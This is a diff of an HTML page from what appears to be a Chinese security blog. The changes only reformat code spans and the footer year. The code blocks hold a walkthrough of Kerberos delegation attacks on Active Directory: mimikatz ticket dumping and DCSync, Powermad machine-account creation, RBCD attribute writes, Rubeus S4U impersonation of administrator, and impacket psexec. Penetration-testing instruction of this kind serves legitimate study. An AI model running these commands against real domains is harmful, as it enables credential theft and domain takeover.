@@ -322,9 +322,9 @@
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">privilege::debug
-sekualsa::tickets
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">privilege::debug
+</span></span><span class="line"><span class="cl">sekualsa::tickets
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p><img
         class="lazyload"
@@ -395,10 +395,10 @@ sekualsa::tickets
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">kerberos::ptt xxxx.kirbi
-
-lsadump::dcsync /domain:test.local /all /csv
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">kerberos::ptt xxxx.kirbi
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">lsadump::dcsync /domain:test.local /all /csv
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h2 id="3-约束委派">3 约束委派</h2>
 <h3 id="31-原理">3.1 原理</h3>
@@ -528,9 +528,9 @@ lsadump::dcsync /domain:test.local /all /csv
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">tgt::ask /user:win7$ /domain:pentest.com /ntlm:&lt;抓取到的哈希&gt;
-tgt::ask /user:win7$ /domain:pentest.com /password:12345
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">tgt::ask /user:win7$ /domain:pentest.com /ntlm:&lt;抓取到的哈希&gt;
+</span></span><span class="line"><span class="cl">tgt::ask /user:win7$ /domain:pentest.com /password:12345
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p><img
         class="lazyload"
@@ -636,9 +636,9 @@ tgt::ask /user:win7$ /domain:pentest.com /password:12345
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">REDTEAM\web3user -&gt; WriteProperty
-NT AUTHORITY\SELF -&gt; WriteProperty
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">REDTEAM\web3user -&gt; WriteProperty
+</span></span><span class="line"><span class="cl">NT AUTHORITY\SELF -&gt; WriteProperty
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>为什么 REDTEAM\web3user 拥有 WriteProperty 权限呢？当 web3 计算机通过域用户 web3user 加入域时，域内会创建名为 <code>web3.redteam.com</code> 的计算机对象，而创建者就是 <code>web3user</code>，所以该域用户具有对 <code>web3.redteam.com</code> 的 WriteProperty 权限。</p>
 <h3 id="42-实战">4.2 实战</h3>
@@ -676,12 +676,12 @@ NT AUTHORITY\SELF -&gt; WriteProperty
 </span><span class="lnt">5
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c"># 查看 SID</span>
-<span class="nb">Get-DomainUser</span> <span class="n">-Identity</span> <span class="no">[userName]</span> <span class="n">-Properties</span> <span class="n">objectsid</span>
-
-<span class="c"># 查看写权限</span>
-<span class="nb">Get-DomainObjectAcl</span> <span class="n">-Identity</span> <span class="no">[computerName]</span> <span class="p">|</span> <span class="p">?{</span><span class="nv">$_</span><span class="p">.</span><span class="n">SecurityIdentifier</span> <span class="o">-match</span> <span class="s2">&#34;SID&#34;</span><span class="p">}</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># 查看 SID</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Get-DomainUser</span> <span class="n">-Identity</span> <span class="no">[userName]</span> <span class="n">-Properties</span> <span class="n">objectsid</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c"># 查看写权限</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Get-DomainObjectAcl</span> <span class="n">-Identity</span> <span class="no">[computerName]</span> <span class="p">|</span> <span class="p">?{</span><span class="nv">$_</span><span class="p">.</span><span class="n">SecurityIdentifier</span> <span class="o">-match</span> <span class="s2">&#34;SID&#34;</span><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p><img
         class="lazyload"
@@ -702,9 +702,9 @@ NT AUTHORITY\SELF -&gt; WriteProperty
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nb">Import-Module</span> <span class="p">.\</span><span class="n">Powermad</span><span class="p">.</span><span class="n">ps1</span>
-<span class="nb">New-MachineAccount</span> <span class="n">-MachineAccount</span> <span class="n">evilsystem</span> <span class="n">-Password</span> <span class="p">$(</span><span class="nb">ConvertTo-SecureString</span> <span class="s2">&#34;testObject&#34;</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span><span class="p">)</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Import-Module</span> <span class="p">.\</span><span class="n">Powermad</span><span class="p">.</span><span class="n">ps1</span>
+</span></span><span class="line"><span class="cl"><span class="nb">New-MachineAccount</span> <span class="n">-MachineAccount</span> <span class="n">evilsystem</span> <span class="n">-Password</span> <span class="p">$(</span><span class="nb">ConvertTo-SecureString</span> <span class="s2">&#34;testObject&#34;</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>添加了一个密码 testObject，名为 hacksystem 的机器账户，接下来就是配置 hacksystem 到 WIN7 的委派了。我们需要做的，是修改 WIN7 的  <code>msDS-AllowedToActOnBehalfOfOtherIdentity </code> 属性的值 ，这个操作我们用 powerview 实现。</p>
 <div class="highlight"><div class="chroma">
@@ -723,19 +723,19 @@ NT AUTHORITY\SELF -&gt; WriteProperty
 </span><span class="lnt">12
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c"># 这里的 sid -&gt; S-1-5-21-3298638106-3321833000-1571791979-1112</span>
-<span class="c"># 是我们创建的 机器用户 evilsystem 的 sid，在 powerview 下用 </span>
-<span class="nb">Get-Domiancomputer</span> <span class="n">hacksystem</span>
-<span class="c"># 获取</span>
-
-<span class="nv">$SD</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">Security</span><span class="p">.</span><span class="n">AccessControl</span><span class="p">.</span><span class="n">RawSecurityDescriptor</span> <span class="n">-ArgumentList</span> <span class="s2">&#34;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-3298638106-3321833000-1571791979-1112)&#34;</span>
-
-<span class="nv">$SDBytes</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">byte</span><span class="p">[]</span> <span class="p">(</span><span class="nv">$SD</span><span class="p">.</span><span class="n">BinaryLength</span><span class="p">)</span>
-
-<span class="nv">$SD</span><span class="p">.</span><span class="n">GetBinaryForm</span><span class="p">(</span><span class="nv">$SDBytes</span><span class="p">,</span> <span class="n">0</span><span class="p">)</span>
-
-<span class="nb">Get-DomainComputer</span> <span class="p">[</span><span class="n">目标主机名</span><span class="p">]|</span> <span class="nb">Set-DomainObject</span> <span class="n">-Set</span> <span class="p">@{</span><span class="s1">&#39;msds-allowedtoactonbehalfofotheridentity&#39;</span><span class="p">=</span><span class="nv">$SDBytes</span><span class="p">}</span> <span class="n">-Verbose</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># 这里的 sid -&gt; S-1-5-21-3298638106-3321833000-1571791979-1112</span>
+</span></span><span class="line"><span class="cl"><span class="c"># 是我们创建的 机器用户 evilsystem 的 sid，在 powerview 下用 </span>
+</span></span><span class="line"><span class="cl"><span class="nb">Get-Domiancomputer</span> <span class="n">hacksystem</span>
+</span></span><span class="line"><span class="cl"><span class="c"># 获取</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$SD</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">Security</span><span class="p">.</span><span class="n">AccessControl</span><span class="p">.</span><span class="n">RawSecurityDescriptor</span> <span class="n">-ArgumentList</span> <span class="s2">&#34;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-3298638106-3321833000-1571791979-1112)&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$SDBytes</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">byte</span><span class="p">[]</span> <span class="p">(</span><span class="nv">$SD</span><span class="p">.</span><span class="n">BinaryLength</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$SD</span><span class="p">.</span><span class="n">GetBinaryForm</span><span class="p">(</span><span class="nv">$SDBytes</span><span class="p">,</span> <span class="n">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">Get-DomainComputer</span> <span class="p">[</span><span class="n">目标主机名</span><span class="p">]|</span> <span class="nb">Set-DomainObject</span> <span class="n">-Set</span> <span class="p">@{</span><span class="s1">&#39;msds-allowedtoactonbehalfofotheridentity&#39;</span><span class="p">=</span><span class="nv">$SDBytes</span><span class="p">}</span> <span class="n">-Verbose</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>验证是否成功添加：</p>
 <p><code>Get-DomainComputer WIN7 -Properties msds-allowedtoactonbehalfofotheridentity</code></p>
@@ -748,8 +748,8 @@ NT AUTHORITY\SELF -&gt; WriteProperty
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">Rubeus.exe <span class="nb">hash</span> /user:evilsystem /password:testObject /domain:xxx
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">Rubeus.exe <span class="nb">hash</span> /user:evilsystem /password:testObject /domain:xxx
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>然后用 <code>evilsystem$ </code>的 hash 请求白银票据并导入到当前会话中：</p>
 <div class="highlight"><div class="chroma">
@@ -759,10 +759,10 @@ NT AUTHORITY\SELF -&gt; WriteProperty
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">Rubeus.exe s4u /user:evilsystem$ /rc4:xxx /impersonateuser:administrator /msdsspn:cifs/dc /ptt
-
-Rubeus.exe s4u /user:evilsystem$ /rc4:xxx /impersonateuser:administrator /msdsspn:host/dc /ptt
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">Rubeus.exe s4u /user:evilsystem$ /rc4:xxx /impersonateuser:administrator /msdsspn:cifs/dc /ptt
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Rubeus.exe s4u /user:evilsystem$ /rc4:xxx /impersonateuser:administrator /msdsspn:host/dc /ptt
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h4 id="425-注意事项">4.2.5 注意事项</h4>
 <p>Rubeus 申请的票据和 impacket 申请的缓存票据有差别，测试时使用 Psexec 返回一个 shell 失败，需要再申请一个 HOST 票据。</p>
@@ -780,16 +780,16 @@ Rubeus.exe s4u /user:evilsystem$ /rc4:xxx /impersonateuser:administrator /msdssp
 </span><span class="lnt">9
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">getST.py -dc-ip IP -spn cifs/target -impersonate administrator pentest.com/evilsystem$:evil
-
-<span class="nb">set</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span>administrator.ccache
-
-python psexec.py -nopass -k target
-
-<span class="c1"># 或者利用 mimikatz 导入票据</span>
-mimikatz.exe <span class="s2">&#34;privilege::debug&#34;</span> <span class="s2">&#34;kerberos::ptc administrator.ccache&#34;</span>
-Psexec.exe <span class="se">\\</span>target -s cmd
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">getST.py -dc-ip IP -spn cifs/target -impersonate administrator pentest.com/evilsystem$:evil
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span>administrator.ccache
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">python psexec.py -nopass -k target
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 或者利用 mimikatz 导入票据</span>
+</span></span><span class="line"><span class="cl">mimikatz.exe <span class="s2">&#34;privilege::debug&#34;</span> <span class="s2">&#34;kerberos::ptc administrator.ccache&#34;</span>
+</span></span><span class="line"><span class="cl">Psexec.exe <span class="se">\\</span>target -s cmd
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h4 id="426-解决敏感账户不能委派">4.2.6 解决敏感账户不能委派</h4>
 <p>利用条件：知道目标的主机账户的凭证</p>
@@ -856,7 +856,7 @@ Psexec.exe <span class="se">\\</span>target -s cmd
 </div>
 </article></div>
             </main><footer class="footer">
-        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2021</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Geekby</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2022</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Geekby</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
         </div>
     </footer></div>
 
